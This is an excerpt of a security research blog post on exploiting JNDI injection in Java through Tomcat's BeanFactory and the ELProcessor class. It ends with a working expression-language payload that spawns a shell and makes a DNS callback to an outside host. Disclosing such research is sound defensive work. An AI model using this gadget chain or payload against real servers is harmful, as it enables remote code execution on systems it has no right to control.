

### Exploiting JNDI Injections in Java

Michael Stepankin January 3, 2019

This class will be used to extract the real object from the attacker's controlled "javax.naming.Reference". It should exist in the target classpath, implement "javax.naming.spi.ObjectFactory" and have at least a "getObjectInstance" method:

```
public interface ObjectFactory {

/**

 * Creates an object using the location or reference information

 * specified.

 * ...

/*

    public Object getObjectInstance(Object obj, Name name, Context nameCtx,

                                    Hashtable environment)

        throws Exception;

}

```

The "org.apache.naming.factory.BeanFactory" class within Apache Tomcat Server contains a logic for bean creation by using reflection:

...

The "BeanFactory" class creates an instance of arbitrary bean and calls its setters for all properties. The target bean class name, attributes, and attribute's values all come from the Reference object, which is controlled by an attacker.

...

The magic property used here is "forceString". By setting it, for example, to "x=eval", we can make a method call with name 'eval' instead of 'setX', for the property 'x'.

So, by utilising the "BeanFactory" class, we can create an instance of arbitrary class with default constructor and call any public method with one "String" parameter.

One of the classes that may be useful here is "javax.el.ELProcessor". In its "eval" method, we can specify a string that will represent a Java expression language template to be executed.

...



```
{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()")}
```



https://www.veracode.com/blog/research/exploiting-jndi-injections-java (Jan 3, 2019)
